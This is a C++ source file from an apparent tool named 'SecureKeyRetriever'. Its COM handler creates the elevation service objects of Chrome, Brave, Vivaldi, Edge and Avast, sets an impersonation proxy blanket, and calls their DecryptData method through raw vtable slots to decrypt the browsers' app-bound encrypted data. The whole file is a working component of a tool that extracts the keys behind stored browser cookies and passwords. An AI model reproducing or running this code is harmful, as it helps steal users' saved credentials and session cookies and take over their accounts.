// Copyright (c) 2026 Eren Taha Akkuş
// Licensed under the MIT License. See LICENSE file in the project root for full license information.

#include "../../include/core/ComHandler.hpp"
#include "../../include/utils/Logger.hpp"
#include "../../include/utils/StringUtils.hpp"
#include <stdexcept>
#include <sstream>
#include <atlbase.h>   // CComPtr (used internally for lifetime management)

#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "rpcrt4.lib")  // For GUID manipulation

namespace SecureKeyRetriever
{
    namespace Core
    {
        ComHandler::ComHandler() : m_comInitialized(false)
        {
        }

        ComHandler::~ComHandler()
        {
            if (m_comInitialized)
            {
                Utils::Logger::Get().LogDebug("Uninitializing COM");
                CoUninitialize();
                m_comInitialized = false;
            }
        }

        bool ComHandler::Initialize()
        {
            if (m_comInitialized)
                return true;

            HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
            if (FAILED(hr))
            {
                Utils::Logger::Get().LogError("CoInitializeEx failed: 0x" + Utils::StringUtils::ToHex((uint32_t)hr));
                return false;
            }

            // COINIT_APARTMENTTHREADED succeeded
            m_comInitialized = true;
            Utils::Logger::Get().LogDebug("COM initialized successfully");
            return true;
        }

        BSTR ComHandler::CreateBstrFromData(const std::vector<uint8_t>& data)
        {
            if (data.empty())
                return nullptr;

            return SysAllocStringByteLen(
                reinterpret_cast<const char*>(data.data()),
                static_cast<UINT>(data.size())
            );
        }

        std::vector<uint8_t> ComHandler::ExtractDataFromBstr(BSTR bstr)
        {
            if (!bstr)
                return {};

            UINT byteLen = SysStringByteLen(bstr);
            std::vector<uint8_t> result(byteLen);
            memcpy(result.data(), bstr, byteLen);
            return result;
        }

        void ComHandler::SetProxyBlanket(IUnknown* pUnknown)
        {
            if (!pUnknown)
                return;

            HRESULT hr = CoSetProxyBlanket(
                pUnknown,
                RPC_C_AUTHN_DEFAULT,          // Use default authentication
                RPC_C_AUTHZ_DEFAULT,          // Use default authorization
                COLE_DEFAULT_PRINCIPAL,       // Principal
                RPC_C_AUTHN_LEVEL_PKT_PRIVACY, // Privacy level (encrypt packets)
                RPC_C_IMP_LEVEL_IMPERSONATE,   // Impersonation level
                nullptr,                       // Authentication identity (none)
                EOAC_DYNAMIC_CLOAKING          // Cloaking capabilities
            );

            if (FAILED(hr))
            {
                Utils::Logger::Get().LogWarning("CoSetProxyBlanket failed: 0x" + Utils::StringUtils::ToHex((uint32_t)hr));
            }
            else
            {
                Utils::Logger::Get().LogDebug("Proxy blanket applied successfully");
            }
        }

        HRESULT ComHandler::InvokeDecryptVtable(
            IUnknown* pUnknown,
            int slotIndex,
            BSTR bstrEnc,
            BSTR* pbstrDec,
            DWORD* pComErr)
        {
            if (!pUnknown || !pbstrDec)
                return E_POINTER;

            // DecryptData signature: HRESULT (STDMETHODCALLTYPE*)(IUnknown*, BSTR, BSTR*, DWORD*)
            using DecryptDataFn = HRESULT(STDMETHODCALLTYPE*)(IUnknown*, BSTR, BSTR*, DWORD*);

            // Get the vtable pointer (first 8 bytes of the object point to the vtable)
            void*** vtablePtr = reinterpret_cast<void***>(pUnknown);
            if (!vtablePtr || !(*vtablePtr))
                return E_FAIL;

            // The vtable is an array of function pointers. Slot 0 is QueryInterface,
            // Slot 1 is AddRef, Slot 2 is Release. Our target method is at slotIndex.
            void* funcPtr = (*vtablePtr)[slotIndex];
            if (!funcPtr)
                return E_FAIL;

            auto pDecrypt = reinterpret_cast<DecryptDataFn>(funcPtr);

            // Invoke the method
            return pDecrypt(pUnknown, bstrEnc, pbstrDec, pComErr);
        }

        std::vector<uint8_t> ComHandler::DecryptData(
            const std::vector<uint8_t>& encryptedData,
            const GUID& clsid,
            const GUID& iid,
            const std::optional<GUID>& iid_v2,
            bool isAvast,
            bool isEdge)
        {
            if (!m_comInitialized)
                throw std::runtime_error("COM not initialized. Call Initialize() first.");

            if (encryptedData.empty())
                throw std::runtime_error("Encrypted data is empty");

            // Create BSTR for input
            BSTR bstrEnc = CreateBstrFromData(encryptedData);
            if (!bstrEnc)
                throw std::runtime_error("Failed to allocate BSTR for encrypted data");
            auto guardBstrEnc = [&]() { if (bstrEnc) SysFreeString(bstrEnc); };
            std::unique_ptr<void, decltype(guardBstrEnc)> bstrGuard(nullptr, [&](void*) { guardBstrEnc(); });

            BSTR bstrDec = nullptr;
            DWORD comErr = 0;
            HRESULT hr = E_FAIL;
            CComPtr<IUnknown> pUnknown;

            // Determine vtable slot for DecryptData
            // Standard Chrome/Brave/Vivaldi: slot 3 (after QueryInterface, AddRef, Release)
            // Avast: slot 12 (13th method in the vtable)
            int slotIndex = 3; // default
            if (isAvast)
                slotIndex = 12;

            // --- Edge specific handling ---
            if (isEdge)
            {
                // Try IEdgeElevator2 first (if v2 is provided)
                if (iid_v2.has_value())
                {
                    hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, *iid_v2, (void**)&pUnknown);
                    if (SUCCEEDED(hr))
                    {
                        SetProxyBlanket(pUnknown);
                        hr = InvokeDecryptVtable(pUnknown, slotIndex, bstrEnc, &bstrDec, &comErr);
                    }
                }

                // Fallback to IEdgeElevator (slot 3)
                if (!iid_v2.has_value() || hr == E_NOINTERFACE || FAILED(hr))
                {
                    pUnknown.Release();
                    hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, (void**)&pUnknown);
                    if (SUCCEEDED(hr))
                    {
                        SetProxyBlanket(pUnknown);
                        hr = InvokeDecryptVtable(pUnknown, slotIndex, bstrEnc, &bstrDec, &comErr);
                    }
                }
            }
            else
            {
                // --- Standard / Avast handling ---
                // Try IElevator2 (v2) first if provided (Chrome 144+)
                if (iid_v2.has_value())
                {
                    hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, *iid_v2, (void**)&pUnknown);
                    if (SUCCEEDED(hr))
                    {
                        SetProxyBlanket(pUnknown);
                        hr = InvokeDecryptVtable(pUnknown, slotIndex, bstrEnc, &bstrDec, &comErr);
                    }
                }

                // Fallback to IElevator (slot 3) if v2 not available or failed
                if (!iid_v2.has_value() || hr == E_NOINTERFACE || FAILED(hr))
                {
                    pUnknown.Release();
                    hr = CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, iid, (void**)&pUnknown);
                    if (SUCCEEDED(hr))
                    {
                        SetProxyBlanket(pUnknown);
                        hr = InvokeDecryptVtable(pUnknown, slotIndex, bstrEnc, &bstrDec, &comErr);
                    }
                }
            }

            // Check results
            if (FAILED(hr))
            {
                std::ostringstream oss;
                oss << "DecryptData COM call failed. HRESULT: 0x" << std::hex << hr;
                if (comErr != 0)
                    oss << " | COM Error: " << std::dec << comErr;
                throw std::runtime_error(oss.str());
            }

            if (!bstrDec)
                throw std::runtime_error("Decrypted BSTR is null");

            // Extract result
            auto result = ExtractDataFromBstr(bstrDec);
            SysFreeString(bstrDec);

            Utils::Logger::Get().LogDebug("Decryption successful. Output size: " + std::to_string(result.size()) + " bytes");
            return result;
        }

        std::vector<uint8_t> ComHandler::DecryptEdgeData(
            const std::vector<uint8_t>& encryptedData,
            const GUID& clsid,
            const GUID& iid,
            const std::optional<GUID>& iid_v2)
        {
            // Edge uses the same logic but with Edge-specific IIDs and flags
            return DecryptData(encryptedData, clsid, iid, iid_v2, false, true);
        }

    } // namespace Core
} // namespace SecureKeyRetriever
